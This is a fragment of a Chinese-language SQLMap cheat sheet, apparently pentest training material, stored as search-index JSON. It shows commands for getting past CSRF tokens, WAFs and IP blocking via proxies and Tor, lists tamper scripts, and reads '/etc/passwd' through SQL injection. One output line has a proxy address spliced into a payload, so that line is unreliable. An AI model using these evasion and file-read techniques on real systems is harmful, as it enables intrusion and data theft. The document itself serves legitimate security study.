<code>csrf</code>\u3001<code>xsrf</code>\u3001<code>token</code>\uff09\uff0c\u7cfb\u7edf\u4e5f\u4f1a\u63d0\u793a\u7528\u6237\u662f\u5426\u5728\u8fdb\u4e00\u6b65\u7684\u8bf7\u6c42\u4e2d\u66f4\u65b0\u5b83\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"\n\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.9}\n|_ -| . [']     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] starting @ 22:18:01 /2020-09-18/\n\nPOST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y\n</code></pre>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#unique-value-bypass","title":"Unique(\u552f\u4e00) Value Bypass","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u53ea\u9700\u8981\u5728\u9884\u5b9a\u4e49\u53c2\u6570\u5185\u63d0\u4f9b\u552f\u4e00\u503c\u3002\u8fd9\u79cd\u673a\u5236\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u63cf\u8ff0\u7684Anti-CSRF \u6280\u672f\uff0c\u53ea\u662f\u4e0d\u9700\u8981\u89e3\u6790\u7f51\u9875\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u7b80\u5355\u5730\u786e\u4fdd\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u6709\u4e00\u4e2a\u9884\u5b9a\u4e49\u53c2\u6570\u7684\u552f\u4e00\u503c\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u8f7b\u677e\u9632\u6b62 CSRF \u5c1d\u8bd5\uff0c\u540c\u65f6\u907f\u514d\u4e00\u4e9b\u81ea\u52a8\u5316\u5de5\u5177\u3002\u4e3a\u6b64\uff0c\u5e94\u4f7f\u7528\u9009\u9879 <code>--randomize</code>\uff0c\u6307\u5411\u5305\u542b\u5728\u53d1\u9001\u524d\u5e94\u968f\u673a\u5316\u7684\u503c\u7684\u53c2\u6570\u540d\u79f0\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1&amp;rp=29125\" --randomize=rp --batch -v 5 | grep URI\n\nURI: http://www.example.com:80/?id=1&amp;rp=99954\nURI: http://www.example.com:80/?id=1&amp;rp=87216\nURI: http://www.example.com:80/?id=9030&amp;rp=36456\nURI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689\nURI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049\nURI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185\n</code></pre>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#bypass","title":"\u8ba1\u7b97\u53c2\u6570 Bypass","text":"<p>\u53e6\u4e00\u79cd\u7c7b\u4f3c\u7684\u673a\u5236\u662f Web \u5e94\u7528\u7a0b\u5e8f\u671f\u671b\u6839\u636e\u67d0\u4e9b\u5176\u4ed6\u53c2\u6570\u503c\u8ba1\u7b97\u51fa\u9002\u5f53\u7684\u53c2\u6570\u503c\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u53c2\u6570\u503c\u5fc5\u987b\u5305\u542b\u53e6\u4e00\u4e2a\u53c2\u6570\u7684\u6d88\u606f\u6458\u8981\uff08\u4f8b\u5982 <code>h=MD5(id)</code>\uff09\u3002\u8981\u7ed5\u8fc7\u8fd9\u4e2a\uff0c\u5e94\u8be5\u4f7f\u7528\u9009\u9879 <code>--eval</code>\uff0c\u5728\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u76ee\u6807\u4e4b\u524d\u8bc4\u4f30\u6709\u6548\u7684 Python \u4ee3\u7801\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\" --batch -v 5 | grep URI\n\nURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\nURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\nURI: http://www.example.com:80/?id=9061&amp;h=4d7e0d72898ae7ea3593eb5ebf20c744\nURI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&amp;h=620460a56536e2d32fb2f4842ad5a08d\nURI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&amp;h=db7c815825b14d67aaa32da09b8b2d42\nURI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&amp;h=02312acd4ebe69e2528382dfff7fc5cc\n</code></pre>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#ip","title":"IP\u5730\u5740\u9690\u85cf","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u9690\u85cf\u6211\u4eec\u7684 IP \u5730\u5740\uff0c\u6216\u8005\u5982\u679c\u67d0\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u5c06\u6211\u4eec\u5f53\u524d IP \u5730\u5740\u5217\u5165\u9ed1\u540d\u5355\u7684\u4fdd\u62a4\u673a\u5236\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u4ee3\u7406\u6216\u533f\u540d\u7f51\u7edc Tor\u3002\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--proxy</code> \u8bbe\u7f6e\u4ee3\u7406\uff08\u4f8b\u5982 <code>--proxy=\"socks4://177.39.187.70:33283\"</code>\uff09\uff0c\u6211\u4eec\u5e94\u8be5\u5728\u5176\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u5de5\u4f5c\u4ee3\u7406\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u4ee3\u7406\u5217\u8868\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--proxy-file</code> \u5c06\u5b83\u4eec\u63d0\u4f9b\u7ed9 SQLMap\u3002\u8fd9\u6837\uff0cSQLMap \u5c06\u6309\u987a\u5e8f\u904d\u5386\u5217\u8868\uff0c\u5982\u679c\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\uff08\u4f8b\u5982\uff0c\u5c06 IP \u5730\u5740\u5217\u5165\u9ed1\u540d\u5355\uff09\uff0c\u5b83\u53ea\u4f1a\u4ece\u5217\u8868\u4e2d\u7684\u5f53\u524d\u8df3\u5230\u4e0b\u4e00\u4e2a\u3002\u53e6\u4e00\u79cd\u9009\u62e9\u662f\u4f7f\u7528 Tor \u7f51\u7edc\u63d0\u4f9b\u6613\u4e8e\u4f7f\u7528\u7684\u533f\u540d\u5316\uff0c\u6211\u4eec\u7684 IP \u53ef\u4ee5\u51fa\u73b0\u5728\u5927\u91cf Tor \u51fa\u53e3\u8282\u70b9\u5217\u8868\u4e2d\u7684\u4efb\u4f55\u5730\u65b9\u3002\u5f53\u5728\u672c\u5730\u673a\u5668\u4e0a\u6b63\u786e\u5b89\u88c5\u65f6\uff0c\u672c\u5730\u7aef\u53e3 9050 \u6216 9150 \u5e94\u8be5\u6709\u4e00\u4e2a <code>SOCKS4</code> \u4ee3\u7406\u670d\u52a1\u3002\u901a\u8fc7\u4f7f\u7528\u5f00\u5173 <code>--tor</code>\uff0cSQLMap \u5c06\u81ea\u52a8\u5c1d\u8bd5\u627e\u5230\u672c\u5730\u7aef\u53e3\u5e76\u9002\u5f53\u5730\u4f7f\u7528\u5b83\u3002</p> <p>\u5982\u679c\u6211\u4eec\u60f3\u786e\u4fdd Tor \u88ab\u6b63\u786e\u4f7f\u7528\uff0c\u4ee5\u9632\u6b62\u4e0d\u5fc5\u8981\u7684\u884c\u4e3a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5f00\u5173 <code>--check-tor</code>\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cSQLMap \u5c06\u8fde\u63a5\u5230 <code>https://check.torproject.org/</code> \u5e76\u68c0\u67e5\u9884\u671f\u7ed3\u679c\u7684\u54cd\u5e94\uff08\u5373\uff0c<code>Congratulations</code> \u51fa\u73b0\u5728\u91cc\u9762\uff09\u3002</p>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#waf-bypass","title":"WAF Bypass","text":"<p>\u6bcf\u5f53\u6211\u4eec\u8fd0\u884c SQLMap \u65f6\uff0c\u4f5c\u4e3a\u521d\u59cb\u6d4b\u8bd5\u7684\u4e00\u90e8\u5206\uff0cSQLMap \u4f1a\u4f7f\u7528\u4e0d\u5b58\u5728\u7684\u53c2\u6570\u540d\u79f0\uff08\u4f8b\u5982<code>\uff1fpfov=...</code>\uff09\u53d1\u9001\u4e00\u4e2a\u9884\u5b9a\u4e49\u7684\u6076\u610f\u8d1f\u8f7d\uff0c\u4ee5\u6d4b\u8bd5\u662f\u5426\u5b58\u5728 WAF\uff08Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff09\u3002\u5728\u7528\u6237\u548c\u76ee\u6807\u4e4b\u95f4\u6709\u4efb\u4f55\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0e\u539f\u59cb\u54cd\u5e94\u76f8\u6bd4\u4f1a\u6709\u5b9e\u8d28\u6027\u7684\u53d8\u5316\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5b9e\u65bd\u4e86\u6700\u6d41\u884c\u7684 WAF \u89e3\u51b3\u65b9\u6848\u4e4b\u4e00 (ModSecurity)\uff0c\u5219\u5728\u6b64\u7c7b\u8bf7\u6c42\u4e4b\u540e\u5e94\u8be5\u6709 <code>406 - Not Acceptable</code> \u54cd\u5e94\u3002</p> <p>\u5728\u68c0\u6d4b\u5230\u9633\u6027\u7684\u60c5\u51b5\u4e0b\uff0c\u4e3a\u4e86\u8bc6\u522b\u5b9e\u9645\u7684\u4fdd\u62a4\u673a\u5236\uff0cSQLMap \u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93 identYwaf\uff0c\u5176\u4e2d\u5305\u542b 80 \u79cd\u4e0d\u540c\u7684 WAF \u89e3\u51b3\u65b9\u6848\u7684\u7b7e\u540d\u3002\u5982\u679c\u6211\u4eec\u60f3\u5b8c\u5168\u8df3\u8fc7\u8fd9\u4e2a\u542f\u53d1\u5f0f\u6d4b\u8bd5\uff08\u5373\u4ea7\u751f\u66f4\u5c11\u7684\u566a\u97f3\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5f00\u5173 <code>--skip-waf</code>\u3002</p>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#_1","title":"\u7528\u6237\u4ee3\u7406\u9ed1\u540d\u5355\u7ed5\u8fc7","text":"<p>\u5982\u679c\u5728\u8fd0\u884c SQLMap \u65f6\u51fa\u73b0\u76f4\u63a5\u95ee\u9898\uff08\u4f8b\u5982\uff0c\u4ece\u4e00\u5f00\u59cb\u5c31\u51fa\u73b0 HTTP \u9519\u8bef\u4ee3\u7801 5XX\uff09\uff0c\u6211\u4eec\u9996\u5148\u5e94\u8be5\u60f3\u5230\u7684\u4e8b\u60c5\u4e4b\u4e00\u662f SQLMap \u4f7f\u7528\u7684\u9ed8\u8ba4\u7528\u6237\u4ee3\u7406\uff08\u4f8b\u5982 <code>User-agent: sqlmap/ 1.4.9(http://sqlmap.org)</code>\uff09\u3002</p> <p>\u4f7f\u7528\u5f00\u5173 <code>--random-agent</code> \u7ed5\u8fc7\u8fd9\u4e00\u70b9\u5f88\u7b80\u5355\uff0c\u5b83\u4f7f\u7528\u4ece\u6d4f\u89c8\u5668\u4f7f\u7528\u7684\u5927\u91cf\u503c\u4e2d\u968f\u673a\u9009\u62e9\u7684\u503c\u66f4\u6539\u9ed8\u8ba4\u7528\u6237\u4ee3\u7406\u3002</p> <p>\u6ce8\u610f\uff1a\u5982\u679c\u5728\u8fd0\u884c\u671f\u95f4\u68c0\u6d4b\u5230\u67d0\u79cd\u5f62\u5f0f\u7684\u4fdd\u62a4\uff0c\u6211\u4eec\u53ef\u4ee5\u9884\u6599\u76ee\u6807\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u751a\u81f3\u5176\u4ed6\u5b89\u5168\u673a\u5236\u4e5f\u4f1a\u51fa\u73b0\u95ee\u9898\u3002\u4e3b\u8981\u539f\u56e0\u662f\u6b64\u7c7b\u9632\u62a4\u63aa\u65bd\u7684\u4e0d\u65ad\u53d1\u5c55\u548c\u65b0\u6539\u8fdb\uff0c\u7559\u7ed9\u653b\u51fb\u8005\u7684\u673a\u52a8\u7a7a\u95f4\u8d8a\u6765\u8d8a\u5c0f\u3002</p>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#tamper-scripts","title":"Tamper Scripts","text":"<p>\u6700\u540e\uff0c\u5728 SQLMap \u4e2d\u5b9e\u73b0\u7684\u7ed5\u8fc7 WAF/IPS \u89e3\u51b3\u65b9\u6848\u7684\u6700\u6d41\u884c\u673a\u5236\u4e4b\u4e00\u662f\u6240\u8c13\u7684\u201cTamper\u201d\u811a\u672c\u3002Tamper \u811a\u672c\u662f\u4e00\u79cd\u7279\u6b8a\u7684 (Python) \u811a\u672c\uff0c\u7528\u4e8e\u5728\u53d1\u9001\u5230\u76ee\u6807\u4e4b\u524d\u4fee\u6539\u8bf7\u6c42\uff0c\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7ed5\u8fc7\u67d0\u4e9b\u4fdd\u62a4\u3002</p> <p>\u4f8b\u5982\uff0c\u6700\u6d41\u884c\u7684 Tamper \u811a\u672c\u4e4b\u4e00\u662f\u5c06\u6240\u6709\u51fa\u73b0\u7684\u5927\u4e8e\u8fd0\u7b97\u7b26 (<code>&gt;</code>) \u66ff\u6362\u4e3a <code>NOT BETWEEN AND #</code>\uff0c\u5c06\u7b49\u4e8e\u8fd0\u7b97\u7b26 (<code>=</code>) \u66ff\u6362\u4e3a <code>BETWEEN # AND #</code>\u3002\u8fd9\u6837\uff0c\u8bb8\u591a\u539f\u59cb\u4fdd\u62a4\u673a\u5236\uff08\u4e3b\u8981\u96c6\u4e2d\u5728\u9632\u6b62 XSS \u653b\u51fb\uff09\u5f88\u5bb9\u6613\u88ab\u7ed5\u8fc7\uff0c\u81f3\u5c11\u5bf9\u4e8e SQLi \u800c\u8a00\u662f\u8fd9\u6837\u3002</p> <p>Tamper \u811a\u672c\u53ef\u4ee5\u5728 <code>--tamper</code> \u9009\u9879\uff08\u4f8b\u5982 <code>--tamper=between,randomcase</code>\uff09\u4e2d\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u94fe\u63a5\u8d77\u6765\uff0c\u5b83\u4eec\u6839\u636e\u9884\u5b9a\u4e49\u7684\u4f18\u5148\u7ea7\u8fd0\u884c\u3002\u9884\u5b9a\u4e49\u4f18\u5148\u7ea7\u4ee5\u9632\u6b62\u4efb\u4f55\u4e0d\u9700\u8981\u7684\u884c\u4e3a\uff0c\u56e0\u4e3a\u67d0\u4e9b\u811a\u672c\u901a\u8fc7\u4fee\u6539\u5176 SQL \u8bed\u6cd5\uff08\u4f8b\u5982 ifnull2ifisnull\uff09\u6765\u4fee\u6539\u6709\u6548\u8d1f\u8f7d\u3002\u76f8\u53cd\uff0c\u4e00\u4e9b Tamper \u811a\u672c\u4e0d\u5173\u5fc3\u5185\u90e8\u5185\u5bb9\uff08\u4f8b\u5982 appendnullbyte\uff09\u3002</p> <p>Tamper \u811a\u672c\u53ef\u4ee5\u4fee\u6539\u8bf7\u6c42\u7684\u4efb\u4f55\u90e8\u5206\uff0c\u4f46\u5927\u591a\u6570\u4f1a\u66f4\u6539\u8d1f\u8f7d\u5185\u5bb9\u3002\u6700\u8457\u540d\u7684\u7be1\u6539\u811a\u672c\u5982\u4e0b\uff1a</p> Tamper-Script Description <code>0eunion</code> \u7528 e0UNION \u66ff\u6362 UNION \u7684\u5b9e\u4f8b <code>base64encode</code> Base64 \u7f16\u7801\u7ed9\u5b9a\u8d1f\u8f7d\u4e2d\u7684\u6240\u6709\u5b57\u7b26 <code>between</code> \u5c06\u5927\u4e8e\u8fd0\u7b97\u7b26 (<code>&gt;</code>) \u66ff\u6362\u4e3a <code>NOT BETWEEN AND #</code>\uff0c\u5c06\u7b49\u4e8e\u8fd0\u7b97\u7b26 (<code>=</code>) \u66ff\u6362\u4e3a <code>BETWEEN # AND #</code> <code>commalesslimit</code> \u7528 <code>LIMIT N OFFSET M</code> \u5bf9\u5e94\u7269\u66ff\u6362 (MySQL) <code>LIMIT M, N</code> \u5b9e\u4f8b <code>equaltolike</code> \u5c06\u6240\u6709\u51fa\u73b0\u7684\u8fd0\u7b97\u7b26\u7b49\u4e8e (<code>=</code>) \u66ff\u6362\u4e3a <code>LIKE</code> \u5bf9\u5e94\u9879 <code>halfversionedmorekeywords</code> \u5728\u6bcf\u4e2a\u5173\u952e\u5b57\u524d\u6dfb\u52a0 (MySQL) \u7248\u672c\u6ce8\u91ca <code>modsecurityversioned</code> \u5305\u542b\u5e26\u6709 (MySQL) \u7248\u672c\u6ce8\u91ca\u7684\u5b8c\u6574\u67e5\u8be2 <code>modsecurityzeroversioned</code> \u5305\u542b\u5e26\u6709 (MySQL) \u96f6\u7248\u672c\u6ce8\u91ca\u7684\u5b8c\u6574\u67e5\u8be2 <code>percentage</code> \u5728\u6bcf\u4e2a\u5b57\u7b26\u524d\u6dfb\u52a0\u767e\u5206\u53f7 (<code>%</code>)\uff08\u4f8b\u5982 SELECT -&gt; %S%E%L%E%C%T\uff09 <code>plus2concat</code> \u7528 (MsSQL) \u51fd\u6570 CONCAT() \u5bf9\u5e94\u9879\u66ff\u6362\u52a0\u53f7\u8fd0\u7b97\u7b26 (<code>+</code>) <code>randomcase</code> \u7528\u968f\u673a\u5927\u5c0f\u5199\u503c\u66ff\u6362\u6bcf\u4e2a\u5173\u952e\u5b57\u5b57\u7b26\uff08\u4f8b\u5982 SELECT -&gt; SEleCt\uff09 <code>space2comment</code> \u5c06\u7a7a\u683c\u5b57\u7b26 ( ) \u66ff\u6362\u4e3a\u6ce8\u91ca `/ <code>space2dash</code> \u5c06\u7a7a\u683c\u5b57\u7b26 ( ) \u66ff\u6362\u4e3a\u7834\u6298\u53f7\u6ce8\u91ca (<code>--</code>)\uff0c\u540e\u8ddf\u968f\u673a\u5b57\u7b26\u4e32\u548c\u65b0\u884c (<code>\\n</code>) <code>space2hash</code> \u5c06\u7a7a\u683c\u5b57\u7b26 ( ) \u7684 (MySQL) \u5b9e\u4f8b\u66ff\u6362\u4e3a\u4e95\u53f7\u5b57\u7b26 (#)\uff0c\u540e\u8ddf\u968f\u673a\u5b57\u7b26\u4e32\u548c\u6362\u884c\u7b26 (<code>\\n</code>) <code>space2mssqlblank</code> \u7528\u4e00\u7ec4\u6709\u6548\u7684\u5907\u7528\u5b57\u7b26\u4e2d\u7684\u968f\u673a\u7a7a\u767d\u5b57\u7b26\u66ff\u6362 (MsSQL) \u7a7a\u683c\u5b57\u7b26 ( ) \u7684\u5b9e\u4f8b <code>symboliclogical</code> \u5c06 AND \u548c OR \u903b\u8f91\u8fd0\u7b97\u7b26\u66ff\u6362\u4e3a\u5176\u7b26\u53f7\u5bf9\u5e94\u9879\uff08<code>&amp;&amp;</code> \u548c <code>||</code>\uff09 <code>versionedkeywords</code> \u7528 (MySQL) \u7248\u672c\u6ce8\u91ca\u5c06\u6bcf\u4e2a\u975e\u51fd\u6570\u5173\u952e\u5b57\u62ec\u8d77\u6765 <code>versionedmorekeywords</code> \u7528 (MySQL) \u7248\u672c\u6ce8\u91ca\u62ec\u8d77\u6bcf\u4e2a\u5173\u952e\u5b57 <p>\u8981\u83b7\u5f97\u5df2\u5b9e\u65bd\u7684\u7be1\u6539\u811a\u672c\u7684\u5b8c\u6574\u5217\u8868\u4ee5\u53ca\u4e0a\u9762\u7684\u63cf\u8ff0\uff0c\u53ef\u4ee5\u4f7f\u7528\u5f00\u5173 <code>--list-tampers</code>\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u4e3a\u4efb\u4f55\u81ea\u5b9a\u4e49\u7c7b\u578b\u7684\u653b\u51fb\u5f00\u53d1\u81ea\u5b9a\u4e49\u7be1\u6539\u811a\u672c\uff0c\u4f8b\u5982\u4e8c\u9636 SQLi\u3002</p>"},{"location":"CheetSheet/SQLMAP/6%E3%80%81%E7%BB%95%E8%BF%87%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4/#bypasses","title":"\u5176\u4ed6 Bypasses","text":"<p>\u5728\u5176\u4ed6\u4fdd\u62a4 Bypass \u673a\u5236\u4e2d\uff0c\u8fd8\u6709\u4e24\u4e2a\u503c\u5f97\u4e00\u63d0\u3002\u7b2c\u4e00\u4e2a\u662f <code>Chunked</code> \u4f20\u8f93\u7f16\u7801\uff0c\u4f7f\u7528\u5f00\u5173 <code>--chunked</code> \u6253\u5f00\uff0c\u5b83\u5c06 POST \u8bf7\u6c42\u7684\u4e3b\u4f53\u62c6\u5206\u4e3a\u6240\u8c13\u7684\u201cchunks(\u5757)\u201d\u3002\u5217\u5165\u9ed1\u540d\u5355\u7684 SQL \u5173\u952e\u5b57\u5728\u5757\u4e4b\u95f4\u62c6\u5206\uff0c\u8fd9\u6837\u5305\u542b\u5b83\u4eec\u7684\u8bf7\u6c42\u53ef\u4ee5\u5728\u4e0d\u88ab\u6ce8\u610f\u7684\u60c5\u51b5\u4e0b\u901a\u8fc7\u3002</p> <p>\u5176\u4ed6\u7ed5\u8fc7\u673a\u5236\u662f HTTP \u53c2\u6570\u6c61\u67d3 (HPP,<code>HTTP parameter pollution</code>\u00a0)\uff0c\u5176\u4e2d\u6709\u6548\u8d1f\u8f7d\u4ee5\u4e0e <code>--chunked</code> \u5728\u4e0d\u540c\u7684\u76f8\u540c\u53c2\u6570\u547d\u540d\u503c\u4e4b\u95f4\u7684\u7c7b\u4f3c\u65b9\u5f0f\u62c6\u5206\uff08\u4f8b\u5982 <code>?id=1&amp;id=UNION&amp;id=SELECT&amp;id=username,password&amp;id=FROM&amp;id =users...</code>)\uff0c\u5982\u679c\u652f\u6301\u5b83\uff08\u4f8b\u5982 <code>ASP</code>\uff09\uff0c\u5219\u7531\u76ee\u6807\u5e73\u53f0\u8fde\u63a5\u3002</p>"},{"location":"CheetSheet/SQLMAP/7%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8%28OS%20Exploitation%29/","title":"7\u3001\u64cd\u4f5c\u7cfb\u7edf\u5229\u7528(OS Exploitation)","text":"<p>SQLMap \u80fd\u591f\u5229\u7528 SQL \u6ce8\u5165\u4ece DBMS \u4e4b\u5916\u7684\u672c\u5730\u7cfb\u7edf\u8bfb\u53d6\u548c\u5199\u5165\u6587\u4ef6\u3002\u5982\u679c\u6211\u4eec\u6709\u9002\u5f53\u7684\u6743\u9650\uff0cSQLMap \u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u8ba9\u6211\u4eec\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u76f4\u63a5\u6267\u884c\u547d\u4ee4\u3002</p>"},{"location":"CheetSheet/SQLMAP/7%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8%28OS%20Exploitation%29/#readwrite","title":"\u6587\u4ef6 Read/Write","text":"<p>\u901a\u8fc7 SQL \u6ce8\u5165\u6f0f\u6d1e\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u7b2c\u4e00\u90e8\u5206\u662f\u5728\u6258\u7ba1\u670d\u52a1\u5668\u4e0a\u8bfb\u53d6\u548c\u5199\u5165\u6570\u636e\u3002\u8bfb\u53d6\u6570\u636e\u6bd4\u5199\u5165\u6570\u636e\u66f4\u5e38\u89c1\uff0c\u8fd9\u5728\u73b0\u4ee3 DBMS \u4e2d\u662f\u4e25\u683c\u7684\u7279\u6743\uff0c\u56e0\u4e3a\u5b83\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u5229\u7528\uff0c\u6b63\u5982\u6211\u4eec\u5c06\u770b\u5230\u7684\u90a3\u6837\u3002\u4f8b\u5982\uff0c\u5728 MySql \u4e2d\uff0c\u8981\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0cDB \u7528\u6237\u5fc5\u987b\u5177\u6709 <code>LOAD DATA</code> \u548c <code>INSERT</code> \u6743\u9650\uff0c\u624d\u80fd\u5c06\u6587\u4ef6\u5185\u5bb9\u52a0\u8f7d\u5230\u8868\u4e2d\uff0c\u7136\u540e\u8bfb\u53d6\u8be5\u8868\u3002</p> <p>\u8fd9\u79cd\u547d\u4ee4\u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\uff1a</p> <ul> <li><code>LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;</code></li> </ul> <p>\u867d\u7136\u6211\u4eec\u4e0d\u4e00\u5b9a\u9700\u8981\u5177\u6709\u6570\u636e\u5e93\u7ba1\u7406\u5458\u6743\u9650 (DBA) \u624d\u80fd\u8bfb\u53d6\u6570\u636e\uff0c\u4f46\u8fd9\u5728\u73b0\u4ee3 DBMS \u4e2d\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\u3002\u8fd9\u540c\u6837\u9002\u7528\u4e8e\u5176\u4ed6\u5e38\u89c1\u7684\u6570\u636e\u5e93\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u5982\u679c\u6211\u4eec\u786e\u5b9e\u62e5\u6709 DBA \u6743\u9650\uff0c\u90a3\u4e48\u6211\u4eec\u66f4\u6709\u53ef\u80fd\u62e5\u6709\u6587\u4ef6\u8bfb\u53d6\u6743\u9650\u3002</p>"},{"location":"CheetSheet/SQLMAP/7%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8%28OS%20Exploitation%29/#dba","title":"\u68c0\u67e5 DBA \u6743\u9650","text":"<p>\u8981\u68c0\u67e5\u6211\u4eec\u662f\u5426\u62e5\u6709 SQLMap \u7684 DBA \u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--is-dba</code> \u9009\u9879\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/case1.php?id=1\" --is-dba\n\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.4.11#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] starting @ 17:31:55 /2020-11-19/\n\n[17:31:55] [INFO] resuming back-end DBMS 'mysql'\n[17:31:55] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\ncurrent user is DBA: False\n\n[*] ending @ 17:31:56 /2020-11-19\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0c\u5982\u679c\u6211\u4eec\u5728\u524d\u9762\u7684\u7ec3\u4e60\u4e2d\u6d4b\u8bd5\u5b83\uff0c\u6211\u4eec\u4f1a\u5f97\u5230\u5f53\u524d\u7528\u6237\u662f DBA: False\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u6ca1\u6709 DBA \u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 SQLMap \u8bfb\u53d6\u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u5f97\u5230\u5982\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>[17:31:43] [INFO] fetching file: '/etc/passwd'\n[17:31:43] [ERROR] no data retrieved\n</code></pre> <p>\u4e3a\u4e86\u6d4b\u8bd5\u64cd\u4f5c\u7cfb\u7edf\u7684\u5229\u7528\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e2a\u6211\u4eec\u786e\u5b9e\u62e5\u6709 DBA \u6743\u9650\u7684\u7ec3\u4e60\uff0c\u5982\u672c\u8282\u672b\u5c3e\u7684\u95ee\u9898\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --is-dba\n\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.4.11#stable}\n|_ -| . [']     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       